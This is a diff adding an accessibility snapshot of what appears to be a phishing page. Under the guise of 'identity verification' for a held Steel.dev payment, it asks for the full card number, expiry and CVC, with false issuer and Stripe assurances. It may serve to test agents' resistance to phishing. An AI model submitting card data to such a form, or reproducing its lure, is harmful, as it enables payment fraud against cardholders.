@@ -1,0 +1,57 @@
+- generic [ref=e2]:
+  - generic [ref=e4]:
+    - img "Steel.dev" [ref=e6]
+    - generic [ref=e7]: Identity verification required
+    - generic [ref=e8]: SGD 82.59 on hold
+    - generic [ref=e9]: To complete your payment, please verify your identity as the authorized cardholder.
+    - generic [ref=e10]:
+      - generic [ref=e11]: Payment details
+      - generic [ref=e12]:
+        - generic [ref=e13]: Merchant
+        - generic [ref=e14]: Steel.dev
+      - generic [ref=e15]:
+        - generic [ref=e16]: Card
+        - generic [ref=e17]:
+          - strong [ref=e18]: VISA
+          - text: •••• 3939
+      - generic [ref=e19]:
+        - generic [ref=e20]: Date
+        - generic [ref=e21]: Apr 2, 2026
+    - generic [ref=e22]:
+      - img [ref=e23]
+      - generic [ref=e25]: This verification is required by your card issuer to prevent unauthorized transactions. Your information is encrypted and secure.
+  - generic [ref=e27]:
+    - heading "Confirm your identity" [level=2] [ref=e28]
+    - paragraph [ref=e29]: Please confirm the details below to verify you are the authorized cardholder and release your payment.
+    - generic [ref=e30]:
+      - generic [ref=e31]: Email address
+      - generic [ref=e33]:
+        - generic [ref=e34]: Email
+        - generic [ref=e35]: contacts.libtia@gmail.com
+    - generic [ref=e36]:
+      - generic [ref=e37]: Cardholder name
+      - textbox "Full name on card" [ref=e38]
+    - generic [ref=e39]:
+      - generic [ref=e40]: Card verification
+      - generic [ref=e41]:
+        - generic [ref=e42]:
+          - textbox "•••• •••• ••••" [ref=e43]
+          - generic [ref=e44]: "3939"
+          - img [ref=e46]:
+            - generic [ref=e48]: VISA
+        - generic [ref=e49]:
+          - textbox "MM / YY" [ref=e51]
+          - generic [ref=e52]:
+            - textbox "CVC" [ref=e53]
+            - generic [ref=e54]: "123"
+    - button "Verify my identity" [ref=e55] [cursor=pointer]
+    - generic [ref=e56]: This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
+    - generic [ref=e57]:
+      - link "Powered by stripe" [ref=e58] [cursor=pointer]:
+        - /url: "#"
+        - text: Powered by
+        - strong [ref=e59]: stripe
+      - link "Terms" [ref=e61] [cursor=pointer]:
+        - /url: "#"
+      - link "Privacy" [ref=e62] [cursor=pointer]:
+        - /url: "#"
